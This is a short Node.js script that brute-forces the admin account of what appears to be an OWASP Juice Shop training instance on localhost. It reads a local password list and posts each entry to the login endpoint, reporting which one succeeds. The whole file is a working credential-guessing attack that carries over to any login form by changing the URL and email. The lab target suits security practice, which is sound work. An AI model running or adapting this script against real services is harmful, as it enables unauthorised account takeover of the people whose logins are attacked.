const fetch = require('node-fetch');
const fs = require('fs');

const email = 'admin@juice-sh.op';
const authUrl = 'http://localhost:3000/rest/user/login';

async function tryPassword(password) {
  const body = JSON.stringify({email, password});
  const method = 'post';
  const headers = {
    'Content-Type': 'application/json',
    'Content-Length': body.length,
  };

  const response = await fetch(authUrl, {
    method,
    body,
    headers,
  });

  const status = await response.statusText;
  if (status === 'OK') {
    return console.log(
      `The email "${email}" and password "${password}" worked! 🏆`,
    );
  }
  return console.log(`Invalid password ${password}`);
}

async function start() {
  passwordsListFile = './passwords-list.txt';

  if (fs.existsSync(passwordsListFile)) {
    const passwords = fs
      .readFileSync(passwordsListFile, 'utf8')
      .toString()
      .split('\n');

    passwords.forEach((password) => {
      tryPassword(password);
    });
  }
}

(function () {
  start();
})();
